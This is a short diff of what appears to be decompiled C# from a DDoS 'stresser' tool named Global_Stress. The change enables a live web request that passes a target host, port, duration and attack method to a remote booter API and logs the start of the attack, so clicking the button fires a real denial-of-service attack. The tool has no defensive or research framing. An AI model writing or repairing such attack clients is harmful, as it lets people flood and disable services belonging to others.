@@ -28,9 +28,7 @@ namespace Global_Stress
 		// Token: 0x06000002 RID: 2 RVA: 0x000020E8 File Offset: 0x000002E8
 		private void localisation_Click(object sender, EventArgs e)
 		{
-            MessageBox.Show("https://trials-esport.com/api"+this.api.Text+".php?key="+this.key.Text+"&host="+this.host.Text+"&port="+this.port.Text+"&time="+this.time.Text+"&method="+this.method.Text);
-			/*
-             * WebClient webClient = new WebClient();
+			WebClient webClient = new WebClient();
 			string text = webClient.DownloadString(string.Concat(new string[]
 			{
 				"https://trials-esport.com/api",
@@ -46,8 +44,7 @@ namespace Global_Stress
 				"&method=",
 				this.method.Text
 			}));
-            */
-			//this.Historique.Text = text;
+			this.Historique.Text = text;
 			this.logs.Clear();
 			this.logs.AppendText("\r\n==============Attack Start==============");
 			this.logs.AppendText("\r\nAPI: " + this.api.Text);
